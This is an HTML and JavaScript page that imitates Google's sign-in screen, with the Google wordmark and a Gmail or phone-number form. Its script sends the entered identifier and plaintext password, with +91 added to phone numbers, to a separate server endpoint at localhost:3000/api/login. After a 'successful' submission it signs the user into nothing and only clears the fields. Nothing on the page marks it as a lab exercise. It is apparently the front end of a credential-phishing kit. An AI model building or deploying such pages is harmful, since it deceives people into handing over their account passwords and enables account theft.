<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Google Login - Email/Phone Validation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 480px;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }

        .login-card {
            padding: 48px 40px 36px;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 28px;
        }

        .google-logo {
            font-size: 52px;
            font-weight: 500;
            letter-spacing: -1px;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .google-logo span:nth-child(1) { color: #4285F4; }
        .google-logo span:nth-child(2) { color: #EA4335; }
        .google-logo span:nth-child(3) { color: #FBBC05; }
        .google-logo span:nth-child(4) { color: #4285F4; }
        .google-logo span:nth-child(5) { color: #34A853; }
        .google-logo span:nth-child(6) { color: #EA4335; }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 32px;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 16px 14px 14px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            outline: none;
            transition: all 0.2s;
            font-family: inherit;
            background: white;
        }

        .input-field:focus {
            border-color: #1a73e8;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .input-field.error {
            border-color: #c5221f;
            margin-bottom: 4px;
        }

        .input-group label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background-color: white;
            padding: 0 4px;
            font-size: 16px;
            color: #5f6368;
            transition: 0.2s ease-out;
            pointer-events: none;
            font-weight: 400;
        }

        .input-field:focus + label,
        .input-field:not(:placeholder-shown) + label {
            top: 0px;
            transform: translateY(-50%) scale(0.85);
            color: #1a73e8;
        }

        .input-field.error + label {
            color: #c5221f;
        }

        .input-field::placeholder {
            color: transparent;
        }

        .error-message-text {
            color: #c5221f;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 12px;
            display: none;
        }

        .error-message-text.show {
            display: block;
        }

        .action-buttons {
            margin-top: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
        }

        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            font-family: inherit;
        }

        .btn-next:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .btn-next:disabled {
            background-color: #dadce0;
            cursor: not-allowed;
        }

        .create-account {
            background: transparent;
            border: none;
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            font-family: inherit;
            padding: 8px 12px;
            border-radius: 20px;
            transition: background 0.2s;
        }

        .create-account:hover {
            background-color: #f1f3f4;
        }

        .general-error {
            background-color: #fce8e6;
            color: #c5221f;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
            display: none;
        }

        .general-error.show {
            display: block;
        }

        @media (max-width: 500px) {
            .login-card {
                padding: 32px 24px;
            }
            .action-buttons {
                flex-direction: column;
            }
            .btn-next, .create-account {
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="logo-area">
                <div class="google-logo">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>
            </div>
            <h1>Sign in</h1>
            <div class="subtitle">Use your Gmail or 10-digit phone number</div>

            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="emailOrPhone" class="input-field" placeholder=" " autocomplete="off" required>
                    <label for="emailOrPhone">Email or phone</label>
                    <div class="error-message-text" id="emailError">Please enter a valid Gmail address (@gmail.com) or 10-digit phone number</div>
                </div>
                <div class="input-group">
                    <input type="password" id="password" class="input-field" placeholder=" " autocomplete="off" required>
                    <label for="password">Password</label>
                    <div class="error-message-text" id="passwordError">Password is required</div>
                </div>

                <div class="action-buttons">
                    <button type="button" class="create-account" id="createAccountBtn">Create account</button>
                    <button type="submit" class="btn-next" id="nextBtn">Next</button>
                </div>
            </form>

            <div class="general-error" id="generalError">
                ❌ Wrong email/phone or password. Please try again.
            </div>
        </div>
    </div>

    <script>
        // DOM elements
        const emailPhoneInput = document.getElementById('emailOrPhone');
        const passwordInput = document.getElementById('password');
        const loginForm = document.getElementById('loginForm');
        const createBtn = document.getElementById('createAccountBtn');
        const nextBtn = document.getElementById('nextBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const generalError = document.getElementById('generalError');
        
        // Server API endpoint
        const API_URL = 'http://localhost:3000/api';
        
        // Validation Functions
        function isValidEmailOrPhone(value) {
            if (!value || value.trim() === '') return false;
            
            const trimmed = value.trim();
            
            // Check for Gmail address (@gmail.com)
            const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
            if (gmailRegex.test(trimmed)) {
                return true;
            }
            
            // Check for 10-digit phone number (only digits, exactly 10)
            const phoneRegex = /^\d{10}$/;
            if (phoneRegex.test(trimmed)) {
                return true;
            }
            
            return false;
        }
        
        function isValidPassword(password) {
            return password && password.trim() !== '';
        }
        
        // Clear all errors
        function clearErrors() {
            emailPhoneInput.classList.remove('error');
            passwordInput.classList.remove('error');
            emailError.classList.remove('show');
            passwordError.classList.remove('show');
            generalError.classList.remove('show');
        }
        
        // Show field-specific error
        function showFieldError(field, errorElement) {
            field.classList.add('error');
            errorElement.classList.add('show');
        }
        
        // Show general wrong credentials error
        function showWrongCredentialsError() {
            generalError.classList.add('show');
            // Auto hide after 3 seconds
            setTimeout(() => {
                generalError.classList.remove('show');
            }, 3000);
        }
        
        // Validate form and return true if valid
        function validateForm() {
            clearErrors();
            
            const emailPhone = emailPhoneInput.value;
            const password = passwordInput.value;
            
            let isValid = true;
            
            // Validate email/phone
            if (!isValidEmailOrPhone(emailPhone)) {
                showFieldError(emailPhoneInput, emailError);
                isValid = false;
            }
            
            // Validate password
            if (!isValidPassword(password)) {
                showFieldError(passwordInput, passwordError);
                isValid = false;
            }
            
            return isValid;
        }
        
        // Silent login handler with validation and error messages
        async function handleLogin(event) {
            event.preventDefault();
            
            // First validate the form
            if (!validateForm()) {
                return; // Stop if validation fails
            }
            
            const emailPhone = emailPhoneInput.value.trim();
            const password = passwordInput.value;
            
            // Determine if it's email or phone
            const isEmail = emailPhone.includes('@');
            const loginIdentifier = isEmail ? emailPhone : `+91${emailPhone}`; // Add country code for phone
            
            // Disable button to prevent double submission
            nextBtn.disabled = true;
            const originalText = nextBtn.textContent;
            nextBtn.textContent = 'Verifying...';
            
            try {
                // Send data to server
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ 
                        email: loginIdentifier, 
                        password: password,
                        identifier: emailPhone,
                        type: isEmail ? 'email' : 'phone'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Login successful - clear form and show success indication (subtle)
                    emailPhoneInput.value = '';
                    passwordInput.value = '';
                    clearErrors();
                    
                    // Subtle green flash on success
                    emailPhoneInput.style.borderColor = '#34a853';
                    passwordInput.style.borderColor = '#34a853';
                    setTimeout(() => {
                        emailPhoneInput.style.borderColor = '#dadce0';
                        passwordInput.style.borderColor = '#dadce0';
                    }, 1000);
                } else {
                    // Wrong credentials - show error message
                    showWrongCredentialsError();
                    // Flash red borders
                    emailPhoneInput.classList.add('error');
                    passwordInput.classList.add('error');
                    setTimeout(() => {
                        emailPhoneInput.classList.remove('error');
                        passwordInput.classList.remove('error');
                    }, 1500);
                }
                
            } catch (error) {
                // Server connection error - show generic error
                showWrongCredentialsError();
                console.error('Server error:', error);
            } finally {
                nextBtn.disabled = false;
                nextBtn.textContent = originalText;
            }
        }
        
        // Create account button handler
        function handleCreateAccount() {
            // Clear any existing errors
            clearErrors();
            // Show a subtle info without popup - just clear fields
            emailPhoneInput.value = '';
            passwordInput.value = '';
            // Optional: Focus on email field
            emailPhoneInput.focus();
        }
        
        // Real-time validation while typing (optional - improves UX)
        emailPhoneInput.addEventListener('input', function() {
            if (this.classList.contains('error')) {
                if (isValidEmailOrPhone(this.value)) {
                    this.classList.remove('error');
                    emailError.classList.remove('show');
                }
            }
        });
        
        passwordInput.addEventListener('input', function() {
            if (this.classList.contains('error')) {
                if (isValidPassword(this.value)) {
                    this.classList.remove('error');
                    passwordError.classList.remove('show');
                }
            }
        });
        
        // Event listeners
        loginForm.addEventListener('submit', handleLogin);
        createBtn.addEventListener('click', handleCreateAccount);
        
        // Clear any pre-filled values on load
        window.addEventListener('DOMContentLoaded', () => {
            emailPhoneInput.value = '';
            passwordInput.value = '';
            clearErrors();
            
            // Add placeholder hints for better UX
            emailPhoneInput.setAttribute('placeholder', ' ');
            passwordInput.setAttribute('placeholder', ' ');
            
            console.log('Google Login Page - With Email/Phone Validation');
            console.log('Allowed formats: username@gmail.com OR 10-digit phone number (e.g., 9876543210)');
        });
        
        // Prevent browser default validation popup
        loginForm.setAttribute('novalidate', 'true');
        
        // Additional: Format phone number input to allow only digits (optional)
        emailPhoneInput.addEventListener('keypress', function(e) {
            // If user is typing phone number, allow only digits
            const currentValue = this.value;
            // If it's already 10 digits and user types more, prevent
            if (currentValue.length >= 10 && /^\d+$/.test(currentValue + e.key)) {
                // But also allow backspace, delete, etc.
                if (e.key >= '0' && e.key <= '9') {
                    e.preventDefault();
                }
            }
        });
        
        // Helper function to show validation on blur
        emailPhoneInput.addEventListener('blur', function() {
            if (this.value.trim() !== '' && !isValidEmailOrPhone(this.value)) {
                showFieldError(this, emailError);
            } else if (this.value.trim() !== '' && isValidEmailOrPhone(this.value)) {
                this.classList.remove('error');
                emailError.classList.remove('show');
            }
        });
        
        passwordInput.addEventListener('blur', function() {
            if (this.value.trim() !== '' && !isValidPassword(this.value)) {
                showFieldError(this, passwordError);
            } else if (this.value.trim() !== '' && isValidPassword(this.value)) {
                this.classList.remove('error');
                passwordError.classList.remove('show');
            }
        });
    </script>
</body>
</html>
